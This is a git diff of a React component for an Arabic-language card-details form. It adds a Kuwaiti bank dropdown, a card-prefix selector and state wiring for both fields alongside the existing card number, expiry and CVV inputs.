@@ -1,3 +1,4 @@
+
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
@@ -7,12 +8,39 @@ const CardDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const [formData, setFormData] = useState({
+    bank: "",
     cardNumber: "",
     expiryMonth: "",
     expiryYear: "",
-    cvv: ""
+    cvv: "",
+    prefix: ""
   });
   const [loading, setLoading] = useState(false);
+
+  // Kuwaiti Banks
+  const kuwaitiBanks = [
+    { value: "", label: "يرجى اختيار البنك" },
+    { value: "nbk", label: "بنك الكويت الوطني" },
+    { value: "gbk", label: "بنك الخليج" },
+    { value: "cbk", label: "البنك التجاري الكويتي" },
+    { value: "abk", label: "بنك الأهلي الكويتي" },
+    { value: "kfh", label: "بيت التمويل الكويتي" },
+    { value: "burgan", label: "بنك برقان" },
+    { value: "warba", label: "بنك وربة" },
+    { value: "boubyan", label: "بنك بوبيان" },
+    { value: "kib", label: "البنك الكويتي الصناعي" },
+    { value: "ksb", label: "بنك الكويت والشرق الأوسط" },
+    { value: "mashreq", label: "بنك المشرق" }
+  ];
+
+  // Kuwaiti Card Prefixes
+  const cardPrefixes = [
+    { value: "", label: "بادئة" },
+    { value: "4", label: "4 (Visa)" },
+    { value: "5", label: "5 (MasterCard)" },
+    { value: "6", label: "6 (Discover)" },
+    { value: "3", label: "3 (American Express)" }
+  ];
 
   const formatCardNumber = (value: string) => {
     const digitsOnly = value.replace(/\D/g, '');
@@ -29,6 +57,8 @@ const CardDetails = () => {
       setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 2)});
     } else if (field === 'expiryYear') {
       setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 4)});
+    } else {
+      setFormData({...formData, [field]: value});
     }
   };
 
@@ -89,8 +119,17 @@ const CardDetails = () => {
             {/* Bank Selection */}
             <div className="space-y-2 sm:space-y-3">
               <div className="flex justify-between items-center">
-                <select className="flex-1 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-sm sm:text-lg" style={{ borderRadius: '8px' }}>
-                  <option>يرجى اختيار البنك</option>
+                <select 
+                  value={formData.bank}
+                  onChange={(e) => handleInputChange('bank', e.target.value)}
+                  className="flex-1 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-sm sm:text-lg z-50" 
+                  style={{ borderRadius: '8px' }}
+                >
+                  {kuwaitiBanks.map((bank) => (
+                    <option key={bank.value} value={bank.value}>
+                      {bank.label}
+                    </option>
+                  ))}
                 </select>
                 <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:يرجى اختيار البنك</label>
               </div>
@@ -100,8 +139,17 @@ const CardDetails = () => {
             <div className="space-y-2 sm:space-y-3">
               <div className="flex justify-between items-center">
                 <div className="flex space-x-2 sm:space-x-3 flex-1">
-                  <select className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base" style={{ borderRadius: '8px' }}>
-                    <option>بادئة</option>
+                  <select 
+                    value={formData.prefix}
+                    onChange={(e) => handleInputChange('prefix', e.target.value)}
+                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50" 
+                    style={{ borderRadius: '8px' }}
+                  >
+                    {cardPrefixes.map((prefix) => (
+                      <option key={prefix.value} value={prefix.value}>
+                        {prefix.label}
+                      </option>
+                    ))}
                   </select>
                   <Input
                     type="text"
@@ -123,7 +171,7 @@ const CardDetails = () => {
                   <select 
                     value={formData.expiryYear}
                     onChange={(e) => handleInputChange('expiryYear', e.target.value)}
-                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base"
+                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50"
                     style={{ borderRadius: '8px' }}
                   >
                     <option value="">YYYY</option>
@@ -137,7 +185,7 @@ const CardDetails = () => {
                   <select 
                     value={formData.expiryMonth}
                     onChange={(e) => handleInputChange('expiryMonth', e.target.value)}
-                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base"
+                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50"
                     style={{ borderRadius: '8px' }}
                   >
                     <option value="">MM</option>
